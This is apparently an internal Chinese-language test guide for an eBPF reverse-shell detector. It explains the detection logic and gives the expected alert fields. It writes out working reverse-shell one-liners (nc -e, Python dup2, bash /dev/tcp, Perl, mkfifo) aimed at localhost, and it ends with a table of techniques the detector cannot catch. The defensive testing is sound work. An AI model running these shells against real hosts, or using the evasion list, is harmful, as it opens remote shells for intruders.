# 反弹 Shell 检测 — 手动测试指南

## 概述

本文档描述如何手动验证 ebpf_base_detector 插件的反弹 Shell 检测功能（DataType 6007）。

**检测原理**：在 `sched_process_exec` Hook 中，当新进程执行时检查其 FD 0（stdin）和 FD 1（stdout）是否指向 IPv4 Socket。任一指向 Socket 即触发告警。

**检测能力边界**：

| 能检测 | 不能检测 |
|--------|----------|
| execve 时 stdin/stdout 已指向 socket 的场景 | stdin/stdout 通过管道（pipe）间接连接 socket 的场景 |
| nc -e、Python dup2、bash /dev/tcp、Perl exec | mkfifo 管道方式、socat PTY 方式 |

## 前置条件

- root 权限
- clang 编译器（eBPF 编译）
- nc（netcat）、python3、perl（测试工具）
- 两个以上终端窗口

## 第一步：编译

```bash
# 1. 进入源代码目录下
cd /home/work/goProject/src/company/agent

# 2. 编译并部署
make build
make deploy
```

## 第二步：启动 Agent

```bash
# Terminal A: 以 standalone 模式启动，事件输出到 stderr
# Agent 运行日志输出到 /opt/cloudsec/logs/agent.log
cd /opt/cloudsec
sudo ./bin/agent -standalone -plugins=ebpf_base_detector -output=stderr -test
```

**可选**：另开终端监控 eBPF 内核调试日志：

```bash
sudo cat /sys/kernel/debug/tracing/trace_pipe | grep "REVERSE SHELL"
```

## 第三步：执行测试用例

每个测试需要两个终端：**Terminal B**（监听端）和 **Terminal C**（触发端）。

> 注意：每个测试用例使用不同端口，避免端口冲突。测试完一个后在 Terminal B 按 Ctrl+C 关闭监听再进行下一个。

---

### 测试 1: nc -e 反弹（最直接）

**Terminal B — 启动监听**：

```bash
nc -lvp 4444
```

**Terminal C — 触发反弹 Shell**：

```bash
# ubuntu 默认的 nc 可能不支持 -e，需要安装 netcat-traditional
# sudo apt install netcat-traditional
nc.traditional -e /bin/bash 127.0.0.1 4444
```

**原理**：nc 建立 TCP 连接后 fork+exec `/bin/bash`，子进程的 stdin/stdout 继承 socket FD。

**预期告警**：

```
level=WARN msg="Reverse shell detected" pid=... comm=bash exe_path=/usr/bin/bash fd_type=3 remote_ip=127.0.0.1 remote_port=4444
```

- `fd_type=3` 表示 stdin(1) + stdout(2) = 3，两者都指向 socket

**验证后清理**：在 Terminal B 输入 `exit` 关闭反弹 Shell，Ctrl+C 关闭监听。

---

### 测试 2: Python dup2 反弹（推荐，可靠性最高）

**Terminal B — 启动监听**：

```bash
nc -lvp 4445
```

**Terminal C — 触发反弹 Shell**：

```bash
python3 -c '
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1",4445))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
'
```

**原理**：Python 创建 socket 连接后，用 `os.dup2()` 将 FD 0/1/2 全部指向 socket，然后 `subprocess.call` 内部调用 `execve("/bin/bash")`。新 bash 进程的 stdin/stdout 直接是 socket。

**预期告警**：

```
level=WARN msg="Reverse shell detected" pid=... comm=bash exe_path=/usr/bin/bash fd_type=3 remote_ip=127.0.0.1 remote_port=4445
```

---

### 测试 3: bash /dev/tcp 反弹

**Terminal B — 启动监听**：

```bash
nc -lvp 4446
```

**Terminal C — 触发反弹 Shell**：

```bash
bash -c 'bash -i >& /dev/tcp/127.0.0.1/4446 0>&1'
```

**原理**：外层 bash 通过内建的 `/dev/tcp` 虚拟文件创建 socket，`>&` 将 stdout/stderr 重定向到 socket，`0>&1` 将 stdin 重定向到 socket，然后 exec 内层 `bash -i`。

**预期告警**：

```
level=WARN msg="Reverse shell detected" pid=... comm=bash exe_path=/usr/bin/bash fd_type=3 remote_ip=127.0.0.1 remote_port=4446
```

---

### 测试 4: Perl 反弹

**Terminal B — 启动监听**：

```bash
nc -lvp 4447
```

**Terminal C — 触发反弹 Shell**：

```bash
perl -e '
use Socket;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
connect(S,sockaddr_in(4447,inet_aton("127.0.0.1")));
open(STDIN,">&S");
open(STDOUT,">&S");
open(STDERR,">&S");
exec("/bin/bash -i");
'
```

**原理**：Perl 建立 socket 连接后，将 STDIN/STDOUT/STDERR 重定向到 socket，然后 `exec` 替换当前进程为 bash。

**预期告警**：

```
level=WARN msg="Reverse shell detected" pid=... comm=bash exe_path=/usr/bin/bash fd_type=3 remote_ip=127.0.0.1 remote_port=4447
```

---

### 测试 5: mkfifo 管道方式（反面用例 — 不应告警）

**Terminal B — 启动监听**：

```bash
nc -lvp 4448
```

**Terminal C — 触发**：

```bash
rm -f /tmp/test_fifo
mkfifo /tmp/test_fifo
cat /tmp/test_fifo | /bin/bash -i 2>&1 | nc 127.0.0.1 4448 > /tmp/test_fifo
```

**原理**：bash 的 stdin 来自 pipe（cat 输出），stdout 也连接到 pipe（nc 输入）。Socket 只存在于 nc 进程上，bash 的 FD 0/1 都是 pipe 而非 socket。

**预期**：Terminal A **不应**对 bash 进程输出 `Reverse shell detected`。可能对 nc 进程触发检测（nc 的 stdin 是 pipe、stdout 指向 fifo，取决于实现）。

**清理**：

```bash
rm -f /tmp/test_fifo
```

## 第四步：验证告警字段

在 Terminal A 的输出中，确认每条告警包含以下关键字段：

| 字段 | 说明 | 示例值 |
|------|------|--------|
| `pid` | 触发进程的线程 ID | 12345 |
| `tgid` | 触发进程的进程 ID | 12345 |
| `ppid` | 父进程 ID | 12300 |
| `comm` | 进程名 | bash |
| `exe_path` | 可执行文件完整路径 | /usr/bin/bash |
| `fd_type` | 触发的 FD 位标志 | 3 (stdin+stdout) |
| `remote_ip` | 攻击者 IP | 127.0.0.1 |
| `remote_port` | 攻击者监听端口 | 4444 |
| `local_ip` | 本机 IP | 127.0.0.1 |
| `local_port` | 本机出站端口 | 随机值 |

**fd_type 含义**：

| 值 | 含义 |
|----|------|
| 1 | 仅 stdin (FD 0) 指向 socket |
| 2 | 仅 stdout (FD 1) 指向 socket |
| 3 | stdin + stdout 都指向 socket |

## 第五步：测试结果记录表

| # | 测试用例 | 预期结果 | 实际结果 | fd_type | remote_ip | remote_port | 备注 |
|---|----------|----------|----------|---------|-----------|-------------|------|
| 1 | nc -e 反弹 | 告警 | | 3 | 127.0.0.1 | 4444 | |
| 2 | Python dup2 反弹 | 告警 | | 3 | 127.0.0.1 | 4445 | |
| 3 | bash /dev/tcp 反弹 | 告警 | | 3 | 127.0.0.1 | 4446 | |
| 4 | Perl exec 反弹 | 告警 | | 3 | 127.0.0.1 | 4447 | |
| 5 | mkfifo 管道 | 不告警 | | - | - | - | 已知局限 |

## 常见问题排查

| 问题 | 排查方法 |
|------|----------|
| Agent 启动失败 `failed to load eBPF` | 确认 root 权限；检查内核版本 >= 5.4；`uname -r` 查看 |
| 无任何告警输出 | 查看 eBPF 调试日志：`sudo cat /sys/kernel/debug/tracing/trace_pipe \| grep hids` |
| `nc -e` 报错 `invalid option` | 安装 `netcat-traditional`：`sudo apt install netcat-traditional`，使用 `nc.traditional` |
| bash /dev/tcp 报错 `No such file` | 确认使用的是 bash（不是 dash/sh）：`bash -c 'echo $BASH_VERSION'` |
| fd_type=1 或 2（不是 3） | 只有一个 FD 指向 socket，检查反弹命令是否正确重定向了 stdin 和 stdout |
| remote_ip 显示 0.0.0.0 | socket 未成功连接，检查监听端是否启动；或 `skc_daddr` 读取失败 |
| remote_port 显示异常值 | 字节序转换问题，检查 `events/types.go` 中 `BigEndian.Uint16` 转换逻辑 |
| 编译 eBPF 报 verifier 错误 | `check_fd_is_socket` 中每一层指针解引用都需要 NULL 检查，确认无遗漏 |
| 告警中 exe_path 为空 | kprobe/raw_tracepoint 中 dentry 遍历可能失败，检查 `read_full_exe_path` 返回值 |

## 测试完成后

1. 在 Terminal A 按 `Ctrl+C` 停止 Agent
2. 清理测试残留：`rm -f /tmp/test_fifo`
3. 将测试结果填入上方记录表，提交到代码仓库

## 已知局限（简易版）

以下反弹 Shell 技术**无法被当前版本检测到**，计划在后续版本中解决：

| 技术 | 原因 | 后续方案 |
|------|------|----------|
| mkfifo 管道方式 | bash 的 FD 0/1 是 pipe 而非 socket | Hook connect/bind 系统调用，关联 socket 与进程树 |
| socat PTY 方式 | FD 指向 PTY 设备而非 socket | 增加 TTY 检测，结合有无 TTY 做辅助判断 |
| 高编号 FD 方式（如 `exec 5<>/dev/tcp/...`） | 只检查 FD 0/1，不检查其他 FD | 扩展 FD 扫描范围（扫描前 16 个 FD） |
| execve 后再 dup2 的方式 | 检测时机在 execve，之后的 dup2 无法感知 | Hook dup2/dup3 系统调用 |
| IPv6 反弹 | 仅检查 AF_INET | 增加 AF_INET6 支持 |
